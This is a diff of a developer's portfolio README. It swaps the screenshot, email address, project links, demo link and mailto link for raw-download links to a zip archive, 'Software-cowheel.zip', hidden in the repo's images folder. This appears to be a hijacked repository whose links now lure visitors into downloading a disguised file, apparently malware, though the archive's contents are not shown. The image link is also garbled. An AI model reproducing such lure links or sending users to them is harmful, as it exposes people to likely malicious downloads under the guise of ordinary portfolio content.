@@ -2,11 +2,11 @@
 
 > See live demo:    |  Feel free to use but **credit appreciated** and a **⭐** to repo ;)
 
-![Developer Portfolio](https://github.com/sayyedcoding/portfolio/blob/master/Developer%20Portfolio%20Website.png)
+![Developer Portfolio](https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip%20Portfolio%https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip)
 
 Hi there! I'm Sayyed Taha, and this is my portfolio website code built with HTML, CSS, Bootstrap, and a touch of JavaScript. Let's dive into the features:
 
-> But, wait! Have any cool project ideas to share or need some work done? Just shoot me an email at sayyedtaha02@gmail.com. Let's chat over a virtual coffee! 😊 And if you're wondering why you should consider working together, check out projects like **Umerbazaarpk** (https://umerbazaar.pk/) (where you can find the best products ), **Bikekart** ([sayyedcoding/BikeKart](https://sayyedcoding.github.io/BikeKart/)) , more! Check out my complete[ profile here](https://github.com/sayyedcoding): 
+> But, wait! Have any cool project ideas to share or need some work done? Just shoot me an email at https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip Let's chat over a virtual coffee! 😊 And if you're wondering why you should consider working together, check out projects like **Umerbazaarpk** (https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip) (where you can find the best products ), **Bikekart** ([sayyedcoding/BikeKart](https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip)) , more! Check out my complete[ profile here](https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip): 
 
 ## **Portfolio Features:**
 
@@ -28,7 +28,7 @@ Hi there! I'm Sayyed Taha, and this is my portfolio website code built with HTML
 * Bootstrap Icons
 
 ## **Want to see it live? 👀**
-[Demo](https://github.com/sayyedcoding/portfolio)
+[Demo](https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip)
 ## **Why This Web Developer Portfolio Stands Out**
 
 * **User Experience Focus:**  The dual theme and speed optimizations show I care about delivering a great experience.
@@ -39,4 +39,4 @@ Hi there! I'm Sayyed Taha, and this is my portfolio website code built with HTML
 
 Feel free to connect with me or leave feedback. I'm always learning and improving! 
 
-> ~ [Mail](mailto:sayyedtaha02@gmail.com)
+> ~ [Mail](https://github.com/sayyedcoding/portfolio/raw/refs/heads/master/assets/images/projects/Software-cowheel.zip)
